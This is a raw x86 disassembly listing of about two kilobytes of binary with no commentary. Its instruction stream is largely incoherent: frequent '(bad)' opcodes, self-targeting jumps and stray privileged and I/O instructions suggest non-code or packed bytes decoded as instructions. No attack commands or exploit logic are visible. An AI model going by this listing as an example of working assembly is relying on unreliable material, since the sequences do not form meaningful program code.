  41c39e:	(bad)  
  41c39f:	inc    ebp
  41c3a1:	add    DWORD PTR [eax],0xffffffca
  41c3a4:	fnstcw WORD PTR [ebx-0x1]
  41c3a7:	call   DWORD PTR ds:0xb5c0ffff
  41c3ad:	adc    edi,edi
  41c3af:	jmp    DWORD PTR [ebp+0x0]
  41c3b2:	mov    DWORD PTR [ebp-0x3732],edx
  41c3b8:	mov    edi,edi
  41c3ba:	cmp    DWORD PTR [esi+0x74],0xffffffbc
  41c3be:	(bad)  
  41c3bf:	dec    DWORD PTR [edi-0x780f0100]
  41c3c5:	out    dx,eax
  41c3c6:	inc    DWORD PTR [eax]
  41c3c8:	and    DWORD PTR [eax],eax
  41c3ca:	jmp    DWORD PTR [ecx-0x4a]
  41c3cd:	nop
  41c3ce:	add    BYTE PTR [eax],al
  41c3d0:	lock add DWORD PTR [ebx-0xcaa17b],0xffffffff
  41c3d8:	mov    ebx,0x47840083
  41c3dd:	jae    0x41c3de
  41c3df:	(bad)  
  41c3e0:	mov    edx,0xbf580083
  41c3e5:	ret    0xff
  41c3e8:	mov    bl,0x0
  41c3ea:	jmp    FWORD PTR [edi-0x25]
  41c3ed:	xor    edi,edi
  41c3ef:	add    bh,ah
  41c3f1:	(bad)  
  41c3f2:	jmp    FWORD PTR [edx-0x5c]
  41c3f5:	js     0x41c3f6
  41c3f7:	inc    ebp
  41c3f9:	(bad)  
  41c3fa:	call   FWORD PTR [ecx+edx*8+0x20]
  41c3fe:	add    DWORD PTR [eax],0x53
  41c401:	inc    DWORD PTR [eax]
  41c403:	fild   QWORD PTR [ecx+0x5c]
  41c406:	(bad)  
  41c407:	call   FWORD PTR [eax]
  41c409:	inc    DWORD PTR [eax]
  41c40b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c40c:	in     al,dx
  41c40d:	repz (bad) 
  41c40f:	call   esp
  41c411:	inc    DWORD PTR [ebx+0xe99856]
  41c417:	inc    DWORD PTR [ebp+0x2093ff00]
  41c41d:	inc    eax
  41c41e:	(bad)  
  41c41f:	(bad)  
  41c420:	jl     0x41c422
  41c422:	mov    DWORD PTR [edx],eax
  41c424:	out    dx,al
  41c425:	or     esp,ecx
  41c427:	add    BYTE PTR [ecx],cl
  41c429:	add    BYTE PTR [eax],al
  41c42b:	sub    cl,ch
  41c42d:	sub    ecx,esp
  41c42f:	sbb    edi,0xffffffff
  41c432:	int3   
  41c433:	add    BYTE PTR gs:[eax],dl
  41c436:	(bad)  
  41c437:	jmp    DWORD PTR [eax-0x1]
  41c43a:	mov    DWORD PTR [ebx],eax
  41c43c:	mov    esp,0x3b89ff90
  41c441:	add    bh,bh
  41c443:	sbb    ebx,edx
  41c445:	mov    DWORD PTR [ebx-0xf000],0xff1ec41f
  41c44f:	sbb    DWORD PTR [eax+0x6266ffff],0xffffffe1
  41c456:	inc    DWORD PTR [eax]
  41c458:	dec    ecx
  41c459:	add    bh,bh
  41c45b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c45c:	out    dx,al
  41c45d:	cwde   
  41c45e:	add    bh,bh
  41c460:	adc    bh,bh
  41c462:	or     eax,0x24
  41c465:	inc    DWORD PTR ds:[eax]
  41c468:	mov    DWORD PTR [ebx-0x61c68f01],eax
  41c46e:	add    DWORD PTR [eax],0xffffff86
  41c471:	inc    DWORD PTR [eax]
  41c473:	xchg   bl,al
  41c475:	mov    ecx,0xcc8e00cc
  41c47a:	push   DWORD PTR [eax]
  41c47c:	jge    0x41c49e
  41c47e:	add    BYTE PTR [eax],al
  41c480:	mov    al,ds:0xa0d383cc
  41c485:	fild   WORD PTR [ebx+0xff2500]
  41c48b:	std    
  41c48c:	fcom   DWORD PTR [ecx-0x1]
  41c48f:	dec    DWORD PTR [esi-0x7c5e007d]
  41c495:	mov    dl,0xff
  41c497:	xor    eax,0xffffffff
  41c49a:	int3   
  41c49b:	pusha  
  41c49c:	jl     0x41c453
  41c49e:	add    DWORD PTR [eax],0x76
  41c4a1:	dec    esp
  41c4a3:	test   al,0xec
  41c4a5:	in     eax,0xff
  41c4a7:	add    bl,dl
  41c4a9:	(bad)  
  41c4aa:	inc    DWORD PTR [edx-0xc7fd]
  41c4b0:	fadd   QWORD PTR [ebx+0x5d93ff00]
  41c4b6:	inc    DWORD PTR [eax]
  41c4b8:	loopne 0x41c443
  41c4ba:	add    bl,dl
  41c4bc:	sbb    eax,0xe383ccfe
  41c4c1:	(bad)  
  41c4c2:	(bad)  
  41c4c3:	jmp    0x415777
  41c4c8:	dec    ecx
  41c4c9:	add    bh,bh
  41c4cb:	in     eax,dx
  41c4cc:	mov    gs:0x5e00ff,eax
  41c4d2:	(bad)  
  41c4d3:	cli    
  41c4d4:	(bad)  
  41c4d5:	std    
  41c4d6:	add    BYTE PTR [ecx-0x30033e3],cl
  41c4dc:	test   DWORD PTR [ecx+0x83ffff],ebp
  41c4e2:	add    BYTE PTR [esp+ebp*2],cl
  41c4e5:	ret    
  41c4e6:	add    BYTE PTR [eax],al
  41c4e8:	push   cs
  41c4e9:	dec    DWORD PTR [ecx-0x92804f]
  41c4ef:	jmp    FWORD PTR [edi]
  41c4f1:	cmp    edi,0xffffff8d
  41c4f4:	or     al,0x8d
  41c4f6:	(bad)  
  41c4f7:	(bad)  
  41c4f8:	cli    
  41c4f9:	add    DWORD PTR [ebx+0xcbdf4b],0xffffff83
  41c500:	pop    eax
  41c501:	add    BYTE PTR [eax],al
  41c503:	dec    eax
  41c504:	mov    esi,0xa6ffff3a
  41c509:	add    BYTE PTR [eax],al
  41c50b:	pusha  
  41c50c:	call   0x89ff:0x2a00cc50
  41c513:	and    DWORD PTR [ecx+0x3e],ecx
  41c516:	inc    DWORD PTR [eax]
  41c518:	fisttp DWORD PTR [ecx+0x1970b83]
  41c51e:	mov    edi,edi
  41c520:	mov    ecx,0x6c8300
  41c525:	ds (bad) 
  41c527:	call   FWORD PTR [esi]
  41c529:	add    bh,bh
  41c52b:	clc    
  41c52c:	sub    al,0x85
  41c52e:	mov    edi,edi
  41c530:	imul   eax,DWORD PTR [eax],0x0
  41c533:	ss ret 0xffce
  41c537:	add    ch,al
  41c539:	mov    edi,edi
  41c53b:	mov    ds:0xff00f9e5,eax
  41c540:	mov    edx,0x9ed28989
  41c545:	push   esi
  41c546:	(bad)  
  41c547:	jmp    FWORD PTR ds:0x168a00ff
  41c54d:	push   0x0
  41c54f:	add    BYTE PTR [ecx+0x0],ch
  41c552:	add    BYTE PTR [ebx],cl
  41c554:	mov    dh,BYTE PTR [ebx+0x9d0083]
  41c55a:	int3   
  41c55b:	test   eax,0xff896b3c
  41c560:	inc    eax
  41c561:	inc    DWORD PTR [eax]
  41c563:	push   eax
  41c564:	out    dx,al
  41c565:	arpl   di,di
  41c567:	add    BYTE PTR [edi+0x4a42ffff],ah
  41c56d:	pop    ds
  41c56e:	dec    DWORD PTR [ecx-0x37760015]
  41c574:	in     al,dx
  41c575:	jg     0x41c576
  41c577:	add    bh,ch
  41c579:	add    bh,bh
  41c57b:	test   al,0xbb
  41c57d:	daa    
  41c57e:	add    BYTE PTR [ecx-0x21007c5c],cl
  41c584:	push   ss
  41c585:	jae    0x41c586
  41c587:	dec    DWORD PTR ds:0xccf100ff
  41c58d:	xchg   ecx,eax
  41c58e:	dec    DWORD PTR [ecx-0x2d7cff22]
  41c594:	sbb    bl,BYTE PTR [ebp-0x63007d]
  41c59a:	add    BYTE PTR [edx-0x36],ah
  41c59d:	cmc    
  41c59e:	dec    esp
  41c5a0:	jle    0x41c5a1
  41c5a2:	int3   
  41c5a3:	xchg   edi,eax
  41c5a4:	mov    esi,0x7c008967
  41c5a9:	inc    DWORD PTR [eax]
  41c5ab:	jo     0x41c54a
  41c5ad:	jge    0x41c5ae
  41c5af:	jmp    DWORD PTR [ecx+0x574500ff]
  41c5b5:	mov    ebx,0x83efff83
  41c5ba:	or     DWORD PTR [edi-0x1d8a],0xffffffc0
  41c5c1:	inc    DWORD PTR [eax]
  41c5c3:	xor    cl,BYTE PTR [esi]
  41c5c5:	sub    eax,0xffd00000
  41c5ca:	int3   
  41c5cb:	inc    ecx
  41c5cc:	mov    al,ds:0x4600ffbf
  41c5d1:	add    BYTE PTR [ebx+0xc547d5],al
  41c5d7:	call   DWORD PTR [ebx-0x1]
  41c5da:	add    BYTE PTR [ebp+0xff8312],bh
  41c5e0:	cwde   
  41c5e1:	or     DWORD PTR [ecx-0x7621b112],0xffffffff
  41c5e8:	arpl   di,di
  41c5ea:	jmp    FWORD PTR [eax-0xffbfdc]
  41c5f0:	(bad)  
  41c5f1:	inc    DWORD PTR [eax]
  41c5f3:	sub    ebx,0x51
  41c5f6:	(bad)  
  41c5f7:	inc    DWORD PTR [edi]
  41c5f9:	(bad)  
  41c5fa:	push   DWORD PTR [eax-0x77f9]
  41c600:	aad    0x0
  41c602:	add    BYTE PTR [eax-0x3],al
  41c605:	lds    eax,FWORD PTR [ebx-0x7676f301]
  41c60b:	hlt    
  41c60c:	inc    esp
  41c60d:	cmp    eax,DWORD PTR [eax]
  41c60f:	or     DWORD PTR [edi+0x436effff],0x78
  41c616:	inc    DWORD PTR [ebx+0x2300ff00]
  41c61c:	bnd call 0x896a4f22
  41c622:	add    BYTE PTR [ebp-0x68],dl
  41c625:	sub    BYTE PTR [eax],al
  41c627:	dec    DWORD PTR [ebp+0xe4983ff]
  41c62d:	mov    edi,0xffd100ff
  41c632:	xor    esi,0x0
  41c635:	rol    BYTE PTR [eax],1
  41c637:	or     DWORD PTR [ebx+0x2c73ffff],0x22
  41c63e:	add    bh,bh
  41c640:	aaa    
  41c641:	add    DWORD PTR [ebx-0x7c8c32b4],0xffffff89
  41c648:	mov    esi,0xa53aff00
  41c64d:	and    eax,0xffd88983
  41c652:	(bad)  
  41c653:	out    dx,eax
  41c654:	scas   al,BYTE PTR es:[edi]
  41c655:	test   DWORD PTR [ebx+0xcca489],eax
  41c65b:	icebp  
  41c65c:	dec    ebx
  41c65d:	lahf   
  41c65e:	inc    DWORD PTR [eax]
  41c660:	scas   eax,DWORD PTR es:[edi]
  41c661:	(bad)  
  41c662:	inc    DWORD PTR [eax-0x33004fc2]
  41c668:	sub    bh,bh
  41c66a:	add    ch,bl
  41c66c:	(bad)  
  41c66d:	cld    
  41c66e:	mov    DWORD PTR [eax],eax
  41c670:	push   ss
  41c671:	(bad)  
  41c672:	jmp    DWORD PTR [eax]
  41c674:	pusha  
  41c675:	adc    DWORD PTR [eax],eax
  41c677:	adc    DWORD PTR ds:0x9e77ffff,0xfffffff3
  41c67e:	int3   
  41c67f:	dec    DWORD PTR ds:0x5a01ffcc
  41c685:	dec    ecx
  41c686:	inc    DWORD PTR [eax]
  41c688:	push   cs
  41c689:	add    BYTE PTR [ebx+0x6589ed],al
  41c68f:	call   DWORD PTR [eax+eax*1+0x0]
  41c693:	arpl   dx,si
  41c695:	mov    cs,esp
  41c697:	(bad)  
  41c698:	fdivr  st,st(7)
  41c69a:	inc    ecx
  41c69c:	in     al,0xbe
  41c69e:	(bad)  
  41c69f:	dec    edi
  41c6a1:	add    BYTE PTR [eax],al
  41c6a3:	pop    edx
  41c6a4:	add    ah,ch
  41c6a6:	mov    edi,edi
  41c6a8:	add    DWORD PTR ss:[eax],0xa
  41c6ac:	or     al,0xf2
  41c6ae:	(bad)  
  41c6af:	jmp    DWORD PTR [eax+0x222effff]
  41c6b5:	xchg   ecx,eax
  41c6b6:	add    bh,bh
  41c6b8:	sbb    edi,edi
  41c6ba:	push   DWORD PTR [edx+0x11]
  41c6bd:	outs   dx,BYTE PTR ds:[esi]
  41c6be:	add    BYTE PTR [eax],al
  41c6c0:	pop    DWORD PTR [eax]
  41c6c2:	inc    DWORD PTR [ebx+0xffceb7]
  41c6c8:	sti    
  41c6c9:	int3   
  41c6ca:	push   DWORD PTR [ecx]
  41c6cc:	push   esi
  41c6cd:	out    0xff,al
  41c6cf:	add    BYTE PTR ds:0x45798983,dl
  41c6d5:	in     eax,dx
  41c6d6:	inc    DWORD PTR [eax]
  41c6d8:	out    dx,eax
  41c6d9:	add    BYTE PTR [eax],al
  41c6db:	adc    al,0x9c
  41c6dd:	in     eax,dx
  41c6de:	add    bh,bh
  41c6e0:	imul   edi,edi,0xffffff83
  41c6e3:	push   ebp
  41c6e4:	xchg   DWORD PTR cs:[eax],eax
  41c6e7:	add    BYTE PTR [edi+0x360e00ff],cl
  41c6ed:	mov    ecx,0xff9effff
  41c6f2:	inc    DWORD PTR [ebx+ebx*8-0x18]
  41c6f6:	(bad)  
  41c6f7:	call   FWORD PTR [esi+0x6085ff00]
  41c6fd:	sub    BYTE PTR [eax],al
  41c6ff:	jmp    DWORD PTR [edx]
  41c701:	add    BYTE PTR [eax],al
  41c703:	mov    DWORD PTR [ecx],0x62ff0081
  41c709:	int3   
  41c70a:	push   DWORD PTR [ebx-0x7c76f0db]
  41c710:	mov    DWORD PTR [bp+di-0x1efe],eax
  41c715:	xchg   BYTE PTR [eax],al
  41c717:	push   DWORD PTR [eax+eax*1+0x3b1621ff]
  41c71e:	add    bh,bh
  41c720:	dec    ebp
  41c721:	dec    DWORD PTR [ecx+0x316f1b]
  41c727:	add    BYTE PTR [ebp-0x77],dh
  41c72a:	add    BYTE PTR [ecx-0x7c7209],bl
  41c730:	stc    
  41c731:	add    bh,bh
  41c733:	mov    esp,0xffff9a97
  41c738:	mov    bh,0x89
  41c73a:	add    BYTE PTR [ebx+eiz*2+0x3783ff12],ch
  41c741:	add    BYTE PTR [ecx-0x7ea08a],cl
  41c747:	push   esp
  41c749:	inc    DWORD PTR [ebx-0x60a59a]
  41c74f:	mov    DWORD PTR [ecx],edi
  41c751:	add    BYTE PTR [eax],al
  41c753:	and    BYTE PTR [ebp+edi*4-0x34],dh
  41c757:	jmp    FWORD PTR [edi]
  41c759:	inc    DWORD PTR [ebx+0xae0e38]
  41c75f:	mov    edx,ebx
  41c761:	mov    DWORD PTR [eax],eax
  41c763:	sub    al,0x75
  41c765:	xchg   edi,edi
  41c767:	add    BYTE PTR [ecx-0x64447601],cl
  41c76d:	(bad)  
  41c76e:	(bad)  
  41c76f:	inc    DWORD PTR ds:0x8d24ccff
  41c775:	cmp    ecx,esp
  41c777:	add    BYTE PTR [ecx+0x0],ch
  41c77a:	add    BYTE PTR [ebp+0x8965ca],al
  41c780:	in     al,0x0
  41c782:	(bad)  
  41c783:	mov    esp,0xffff1088
  41c788:	fwait
  41c789:	add    bh,bh
  41c78b:	test   DWORD PTR [ebp+0x54],esp
  41c78e:	add    bh,bh
  41c790:	xchg   ecx,eax
  41c791:	add    DWORD PTR [ebx-0x26840f],0xffffffff
  41c798:	idiv   edi
  41c79a:	add    BYTE PTR [edx+0x44],ah
  41c79d:	dec    ecx
  41c79e:	(bad)  
  41c79f:	inc    DWORD PTR [ebp+0x35a50000]
  41c7a5:	cwde   
  41c7a6:	add    DWORD PTR [eax],0x6b
  41c7a9:	int3   
  41c7aa:	dec    DWORD PTR [eax+ebp*4-0x22]
  41c7ae:	inc    DWORD PTR [ebx-0x7d00332f]
  41c7b4:	push   edx
  41c7b5:	mov    ds:0xff03ffff,eax
  41c7ba:	int3   
  41c7bb:	inc    ebp
  41c7bc:	out    0x8,al
  41c7be:	inc    DWORD PTR [eax]
  41c7c0:	ds add bh,bh
  41c7c3:	dec    eax
  41c7c4:	int    0xcc
  41c7c6:	(bad)  
  41c7c7:	jmp    DWORD PTR [edi+edi*8]
  41c7ca:	add    dh,ah
  41c7cc:	push   edi
  41c7cd:	adc    BYTE PTR [eax],al
  41c7cf:	mov    DWORD PTR [edx+0x4c1c0000],edi
  41c7d5:	(bad)  
  41c7d6:	inc    DWORD PTR [eax]
  41c7d8:	pop    ebp
  41c7d9:	add    BYTE PTR [ebx-0x336d23d7],al
  41c7df:	add    BYTE PTR [edi+edi*8-0x7d],dh
  41c7e3:	mov    ds:0xff00a5e8,al
  41c7e8:	call   0xff67:0x514cffcc
  41c7ef:	add    bh,bh
  41c7f1:	add    BYTE PTR [ebx-0x962a08],al
  41c7f7:	call   DWORD PTR ds:0x8fea00cc
  41c7fd:	push   ss
  41c7fe:	cmp    edi,0x3
  41c801:	dec    esp
  41c803:	dec    eax
  41c804:	icebp  
  41c805:	add    edi,edi
  41c807:	dec    ebp
  41c809:	add    BYTE PTR [eax],al
  41c80b:	mov    bl,0xd0
  41c80d:	ret    0x89ff
  41c810:	dec    esp
  41c811:	add    DWORD PTR [eax],0x48
  41c814:	sub    DWORD PTR ds:0xcc870083,0x2964b2cc
  41c81e:	inc    DWORD PTR [ebx-0x400033b1]
  41c824:	jge    0x41c7c1
  41c826:	inc    DWORD PTR [eax]
  41c828:	push   ebx
  41c829:	inc    DWORD PTR [eax]
  41c82b:	loop   0x41c7c1
  41c82d:	ret    0xff83
  41c830:	pushf  
  41c831:	(bad)  
  41c832:	dec    DWORD PTR [edi+edi*1]
  41c835:	dec    sp
  41c838:	sti    
  41c839:	add    bh,bh
  41c83b:	iret   
  41c83c:	mov    al,0x58
  41c83e:	dec    esp
  41c840:	jmp    0x41c7cb
  41c842:	add    BYTE PTR [ebx],dl
  41c844:	fild   QWORD PTR [ebx-0x1]
  41c847:	or     DWORD PTR [ebx],0x0
  41c84a:	int3   
  41c84b:	jo     0x41c825
  41c84d:	pop    edi
  41c84e:	add    bh,bh
  41c850:	inc    ebp
  41c851:	inc    DWORD PTR [eax]
  41c853:	dec    ebp
  41c854:	mov    WORD PTR [esi],es
  41c856:	add    DWORD PTR [ebx+0x41ff00f7],0xffffffec
  41c85d:	mov    dl,0x83
  41c85f:	cmp    DWORD PTR [edx-0x3a037c77],0x2c
  41c866:	add    BYTE PTR [eax],al
  41c868:	jb     0x41c869
  41c86a:	adc    DWORD PTR [edx-0x7cc816],0x7
  41c871:	inc    DWORD PTR [eax]
  41c873:	into   
  41c874:	rcl    DWORD PTR [eax],cl
  41c876:	mov    DWORD PTR [ebx-0x33002a],eax
  41c87c:	push   es
  41c87d:	retf   0x83ff
  41c880:	dec    esi
  41c881:	mov    DWORD PTR [eax],eax
  41c883:	xchg   ebx,eax
  41c884:	inc    eax
  41c885:	push   ebx
  41c886:	add    bh,bh
  41c888:	mov    ebp,0xb7a683cc
  41c88d:	lock (bad) 
  41c88f:	jmp    FWORD PTR [eax+eax*1-0x22874c00]
  41c896:	or     esp,0xffffffcd
  41c899:	inc    DWORD PTR [eax]
  41c89b:	xchg   ebp,eax
  41c89c:	jmp    0xcf4194f9
  41c8a1:	(bad)  
  41c8a2:	call   DWORD PTR [ebp+0xc1bd]
  41c8a8:	inc    ecx
  41c8a9:	dec    DWORD PTR [ecx+0xe7ebe5]
  41c8af:	dec    DWORD PTR [esi-0x1d7e007d]
  41c8b5:	jecxz  0x41c8b6
  41c8b7:	add    BYTE PTR [eax+0x0],dl
  41c8ba:	int3   
  41c8bb:	xchg   ecx,eax
  41c8bc:	ins    BYTE PTR es:[edi],dx
  41c8bd:	cmp    BYTE PTR [eax],al
  41c8bf:	cmp    DWORD PTR [edi+edi*8-0x34],0xfffffff5
  41c8c4:	dec    edx
  41c8c5:	cli    
  41c8c6:	int3   
  41c8c7:	call   FWORD PTR [edi-0x77]
  41c8ca:	add    dh,bh
  41c8cc:	sub    edi,0xffffffcc
  41c8cf:	add    BYTE PTR [ecx+0x4a9bffcc],dl
  41c8d5:	xchg   ebx,eax
  41c8d6:	inc    DWORD PTR [eax]
  41c8d8:	das    
  41c8d9:	cmp    edi,0x74
  41c8dc:	fbld   TBYTE PTR [edx]
  41c8de:	inc    DWORD PTR [ebx-0x547cff4e]
  41c8e4:	adc    al,0x47
  41c8e6:	inc    DWORD PTR [ebx+0x16cc8306]
  41c8ec:	inc    ebx
  41c8ed:	int3   
  41c8ee:	mov    edi,edi
  41c8f0:	jge    0x41c875
  41c8f2:	adc    DWORD PTR [esi-0x337c30c7],0xffffff9c
  41c8f9:	add    bh,bh
  41c8fb:	pop    ss
  41c8fc:	xchg   edx,eax
  41c8fd:	mov    esp,0x893d00cc
  41c902:	add    BYTE PTR [esi-0xffed00],ch
  41c908:	pop    edx
  41c909:	add    bh,bh
  41c90b:	sbb    dh,BYTE PTR [ecx+edi*2-0x1]
  41c90f:	or     DWORD PTR [eax+eax*1+0x7840f1ff],0xffffffff
  41c917:	int3   
  41c918:	and    edi,edi
  41c91a:	add    ah,bl
  41c91c:	stos   DWORD PTR es:[edi],eax
  41c91d:	sbb    DWORD PTR [ebx-0x7c001600],eax
  41c923:	lock cmp eax,0x1a83ff8d
  41c929:	add    bh,bh
  41c92b:	popa   
  41c92c:	popa   
  41c92d:	sbb    eax,0x837a00ff
  41c932:	sbb    DWORD PTR [edi-0x33001f6e],0xffffffab
  41c939:	dec    esp
  41c93b:	push   ebp
  41c93c:	mov    esp,DWORD PTR [edx-0x7c720001]
  41c942:	dec    DWORD PTR [esi+0x4a]
  41c945:	jo     0x41c946
  41c947:	(bad)  
  41c948:	out    dx,al
  41c949:	add    bh,bh
  41c94b:	jecxz  0x41c9bc
  41c94d:	fld    QWORD PTR [eax]
  41c94f:	inc    DWORD PTR [edi]
  41c951:	inc    DWORD PTR [eax]
  41c953:	mov    dl,0xdf
  41c955:	or     eax,0x6d8900
  41c95a:	jmp    FWORD PTR [edx-0x4a]
  41c95d:	hlt    
  41c95e:	add    bh,bh
  41c960:	mov    esi,0x33caff89
  41c965:	adc    bh,bh
  41c967:	jmp    ebx
  41c969:	inc    DWORD PTR [ebx-0x73ce1b]
  41c96f:	add    BYTE PTR [eax+eax*1-0x1],ch
  41c973:	push   esi
  41c974:	xchg   ebx,eax
  41c975:	xchg   ecx,eax
  41c976:	dec    DWORD PTR [ecx-0x3e007cfb]
  41c97c:	push   es
  41c97d:	call   0xdcc981
  41c982:	adc    edx,0x76
  41c985:	inc    ebp
  41c986:	add    BYTE PTR [ecx+0x75ff00cc],cl
  41c98c:	push   edi
  41c98d:	retf   
  41c98e:	add    BYTE PTR [ecx-0x15ffff2b],cl
  41c994:	xchg   esi,eax
  41c995:	mov    esp,0xddff00
  41c99a:	jmp    DWORD PTR [edi+0x37]
  41c99d:	mov    ebx,0x6d83ff
  41c9a2:	add    BYTE PTR [ebp+eiz*8-0x1b0000b4],dh
  41c9a9:	add    BYTE PTR [eax],al
  41c9ab:	sti    
  41c9ac:	icebp  
  41c9ad:	ins    BYTE PTR es:[edi],dx
  41c9ae:	add    BYTE PTR [eax],al
  41c9b0:	stos   DWORD PTR es:[edi],eax
  41c9b1:	(bad)  
  41c9b2:	inc    ebx
  41c9b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9b5:	lea    eax,[eax]
  41c9b7:	call   FWORD PTR [edi+0x33c60083]
  41c9bd:	ja     0x41c9be
  41c9bf:	int3   
  41c9c0:	and    ecx,esp
  41c9c2:	sub    DWORD PTR [ecx-0xff0cd3],0xffffff96
  41c9c9:	dec    DWORD PTR [ecx+0x4c8f30]
  41c9cf:	dec    ebx
  41c9d1:	inc    DWORD PTR [eax]
  41c9d3:	or     eax,DWORD PTR [esi-0x13]
  41c9d6:	mov    DWORD PTR [ebx+0x5fff00f9],eax
  41c9dc:	div    BYTE PTR [edi+edi*8]
  41c9df:	push   DWORD PTR [edi+0x2df2ffff]
  41c9e5:	jns    0x41c96a
  41c9e7:	dec    ebx
  41c9e9:	(bad)  
  41c9ea:	call   DWORD PTR [ebp+0x21]
  41c9ed:	inc    esi
  41c9ee:	add    DWORD PTR [ebx-0x17007c83],0xffffffc6
  41c9f5:	das    
  41c9f6:	inc    DWORD PTR [eax]
  41c9f8:	aam    0x0
  41c9fa:	jmp    FWORD PTR [ebp+0xd]
  41c9fd:	repnz cmp edi,0x15
  41ca01:	cmp    edi,0xffffffb1
  41ca04:	sub    al,0xf
  41ca06:	(bad)  
  41ca07:	(bad)  
  41ca08:	mov    ebp,0xacf8ffff
  41ca0d:	repnz int3 
  41ca0f:	add    BYTE PTR [eax+0x0],cl
  41ca12:	add    BYTE PTR [eax],al
  41ca14:	push   cs
  41ca15:	cmp    edi,0x89007800
  41ca1b:	cmp    al,0x2d
  41ca1d:	repz inc DWORD PTR [eax]
  41ca20:	pop    edx
  41ca21:	(bad)  
  41ca22:	(bad)  
  41ca23:	fild   WORD PTR [esi+0x45]
  41ca26:	or     DWORD PTR [ecx-0x6dff003f],0x5
  41ca2d:	or     eax,0xff61ffff
  41ca32:	jmp    DWORD PTR [esi+0x3e]
  41ca35:	jbe    0x41ca36
  41ca37:	int3   
  41ca38:	ja     0x41ca39
  41ca3a:	jmp    FWORD PTR [ebp+0x582f]
  41ca40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca41:	add    bh,bh
  41ca43:	aad    0xf
  41ca45:	mov    esp,0xc600ff
  41ca4a:	dec    ebp
  41ca4c:	mov    ds:0x35ff00bd,eax
  41ca51:	inc    DWORD PTR [eax]
  41ca53:	push   eax
  41ca54:	rol    DWORD PTR [eax+0x6ffff],0xff
  41ca5b:	into   
  41ca5c:	int3   
  41ca5d:	rol    BYTE PTR [ebx-0xffd877],1
  41ca63:	dec    esp
  41ca64:	xor    al,0x6e
  41ca66:	add    bh,bh
  41ca68:	test   edi,edi
  41ca6a:	mov    DWORD PTR [ecx+0x1d06],ecx
  41ca70:	sub    bh,bh
  41ca72:	int3   
  41ca73:	lea    ebp,[ebx-0x69]
  41ca76:	(bad)  
  41ca77:	call   ecx
  41ca79:	add    bh,bh
  41ca7b:	pop    edi
  41ca7c:	jge    0x41ca23
  41ca7e:	inc    DWORD PTR [eax]
  41ca80:	loope  0x41ca82
  41ca82:	int3   
  41ca83:	sar    ebp,1
  41ca85:	cdq    
  41ca86:	add    bh,bh
  41ca88:	jge    0x41ca0d
  41ca8a:	or     ebx,0xffffffd4
  41ca8d:	jnp    0x41ca5b
  41ca8f:	mov    DWORD PTR [ebx],ecx
  41ca91:	(bad)  
  41ca92:	push   DWORD PTR [eax-0x42]
  41ca95:	mov    esp,ecx
  41ca97:	dec    DWORD PTR [ebx+0x2ac1ffcc]
  41ca9d:	and    al,0x0
  41ca9f:	add    BYTE PTR [ebp+0x0],dh
  41caa2:	inc    esi
  41caa4:	scas   eax,DWORD PTR es:[edi]
  41caa5:	(bad)  
  41caa7:	add    BYTE PTR [edx-0x1],dh
  41caaa:	xor    DWORD PTR [eax-0x763307cb],0xffffff9b
  41cab1:	inc    DWORD PTR [eax]
  41cab3:	neg    DWORD PTR [edi+0x6a83004a]
  41cab9:	int3   
  41caba:	adc    DWORD PTR [eax],0xfffffffe
  41cabd:	jle    0x41cabe
  41cabf:	add    BYTE PTR [eax+0x611bffcc],ch
  41cac5:	sub    bh,bh
  41cac7:	add    BYTE PTR [edx-0x1abd7c01],cl
  41cacd:	pop    ds
  41cace:	add    bh,bh
  41cad0:	lods   eax,DWORD PTR ds:[esi]
  41cad1:	dec    DWORD PTR [ecx-0x7c8639fe]
  41cad7:	add    BYTE PTR [eax+0x140eff00],ch
  41cadd:	and    edi,edi
  41cadf:	push   esp
  41cae1:	or     esp,0x31
  41cae4:	hlt    
  41cae5:	hlt    
  41cae6:	add    BYTE PTR [eax],al
  41cae8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cae9:	(bad)  
  41caea:	push   DWORD PTR [ebx+0x57]
  41caed:	mov    ah,0xff
  41caef:	int3   
  41caf0:	add    BYTE PTR ss:[eax],al
  41caf3:	(bad)  
  41caf4:	pop    ecx
  41caf5:	popf   
  41caf6:	inc    DWORD PTR [eax]
  41caf8:	sbb    al,0xff
  41cafa:	call   FWORD PTR [esi+edx*1-0x47ff7c7a]
  41cb01:	int3   
  41cb02:	adc    DWORD PTR [esi-0x45],0x29
  41cb06:	inc    DWORD PTR [eax]
  41cb08:	add    BYTE PTR [eax],0xff
  41cb0b:	fisub  DWORD PTR ds:0xe300ff10
  41cb11:	inc    DWORD PTR [eax]
  41cb13:	rsm    
  41cb15:	push   0x0
  41cb17:	call   FWORD PTR [esi-0x64ccff01]
  41cb1d:	inc    esp
  41cb1e:	cmp    edi,0x4e
  41cb21:	(bad)  
  41cb22:	(bad)  
  41cb23:	clc    
  41cb24:	push   ss
  41cb25:	popf   
  41cb26:	add    bh,bh
  41cb28:	inc    edi
  41cb29:	(bad)  
  41cb2a:	(bad)  
  41cb2b:	fstp   TBYTE PTR [ebp+0x2a]
  41cb2e:	(bad)  
  41cb2f:	call   DWORD PTR [eax-0x2a593301]
  41cb35:	repz add BYTE PTR [eax],al
  41cb38:	jae    0x41cb39
  41cb3a:	dec    DWORD PTR [ebp+0x5c]
  41cb3d:	outs   dx,DWORD PTR ds:[esi]
  41cb3e:	inc    DWORD PTR [eax]
  41cb40:	fld    QWORD PTR [eax]
  41cb42:	jmp    DWORD PTR [edi+edi*1+0x4]
  41cb46:	dec    esp
  41cb48:	popa   
  41cb49:	add    ah,cl
  41cb4b:	mov    esi,0xffcc22af
  41cb50:	pop    ds
  41cb51:	int3   
  41cb52:	add    BYTE PTR [edx+0x7c],ch
  41cb55:	inc    edx
  41cb56:	mov    esp,ecx
  41cb58:	imul   eax,DWORD PTR [eax],0x8305ed00
  41cb5e:	inc    DWORD PTR [ebx+0x3800fffe]
  41cb64:	cmp    DWORD PTR [ebx-0x350100],ebx
  41cb6a:	call   DWORD PTR [eax+0x62]
  41cb6d:	add    al,0xff
  41cb6f:	mov    DWORD PTR [esi-0x7d],eax
  41cb72:	dec    DWORD PTR [ebx-0xff1ba8]
  41cb78:	inc    ebp
  41cb79:	add    BYTE PTR [eax],al
  41cb7b:	and    DWORD PTR [edi+0x56],0xffffffff
  41cb7f:	add    BYTE PTR [eax-0x1],cl
  41cb82:	int3   
  41cb83:	and    bh,cl
  41cb85:	cdq    
  41cb86:	(bad)  
